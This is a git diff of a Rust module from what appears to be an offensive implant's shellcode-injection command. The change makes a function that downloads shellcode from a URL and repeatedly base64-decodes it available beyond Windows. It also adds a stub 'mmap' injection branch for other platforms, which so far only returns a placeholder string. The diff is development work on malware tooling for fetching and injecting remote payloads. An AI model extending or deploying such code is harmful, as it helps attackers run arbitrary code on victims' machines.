@@ -1,7 +1,9 @@
 use std::error::Error;
 use crate::logger::Logger;
 use crate::cmd::CommandArgs;
-#[cfg(windows)] use base64::decode as b64_decode;
+use memmap2::MmapMut;
+
+use base64::decode as b64_decode;
 #[cfg(windows)] extern crate winapi;
 #[cfg(windows)] extern crate kernel32;
 #[cfg(windows)] use winapi::um::winnt::{
@@ -20,10 +22,10 @@ use crate::cmd::CommandArgs;
     synchapi::WaitForSingleObject
 };
 #[cfg(windows)] use std::ptr;
-#[cfg(windows)] use reqwest::Client;
+use reqwest::Client;
 
 /// Handles the retrieval and deobfuscation of shellcode from a url.
-#[cfg(windows)]
+// #[cfg(windows)]
 async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
     // Download shellcode, or try to
     let client = Client::new();
@@ -278,5 +280,16 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
 
 #[cfg(not(windows))]
 pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
-    Ok("Can only inject shellcode on Windows!".to_string())   
+
+    if let Some(inject_type) = cmd_args.nth(0) {
+        match inject_type.as_str() {
+            "mmap" => {
+                return Ok("MMMMap".to_string());
+            },
+            _ => { return Ok("Unknown injection method!".to_string()) ;}
+        }
+
+    } else {
+        return Ok("No injection type provided!".to_string());
+    }
 }
